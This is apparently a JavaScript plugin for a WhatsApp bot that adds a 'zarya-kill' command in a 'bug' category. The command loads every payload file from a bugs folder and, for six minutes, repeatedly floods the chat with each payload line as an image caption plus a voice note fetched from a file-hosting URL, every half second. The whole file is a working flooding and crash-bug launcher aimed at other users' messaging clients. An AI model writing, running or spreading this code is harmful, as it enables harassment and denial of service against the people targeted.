const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'zarya-kill',
  desc: 'Zarya-KILL attack using image + audio only (6min)',
  category: 'bug',
  react: '🔪',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX || '.';

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'zarya-kill') return;

    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await bot.sendMessage(from, { text: '📁 No payloads found in /bugs folder.' }, { quoted: mek });
    }

    await bot.sendMessage(from, {
      text: `🔪 *ZARYA-KILL Launched!*\n📦 Payloads: ${bugFiles.length}\n🕒 Duration: 6min\n📸 Mode: Image + Audio`,
    }, { quoted: mek });

    const endTime = Date.now() + (6 * 60 * 1000); // 6 minutes

    async function sendKill(line) {
      // Send image
      await bot.sendMessage(from, {
        image: { url: path.resolve(__dirname, '../media/1.png') },
        caption: `🔪 ${line}\n_ZARYA-KILL EXECUTION_`,
      });

      // Send audio only
      await bot.sendMessage(from, {
        audio: { url: 'https://files.catbox.moe/8e7mkq.mp4' },
        mimetype: 'audio/mp4',
        ptt: true
      });
    }

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(bugsDir, file);
          delete require.cache[require.resolve(payloadPath)];
          let bugPayload = require(payloadPath);

          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async () => msg;
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async () => msg;
          }

          if (typeof bugPayload === 'function') {
            const result = await bugPayload(m, bot);
            if (Array.isArray(result)) {
              for (const line of result) {
                await sendKill(line);
                await new Promise(res => setTimeout(res, 500));
              }
            } else if (typeof result === 'string') {
              await sendKill(result);
              await new Promise(res => setTimeout(res, 500));
            }
          }
        } catch (e) {
          console.error(`❌ Error in ${file}:`, e.message);
        }
      }
    }

    await bot.sendMessage(from, {
      text: `✅ *ZARYA-KILL Completed*`,
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});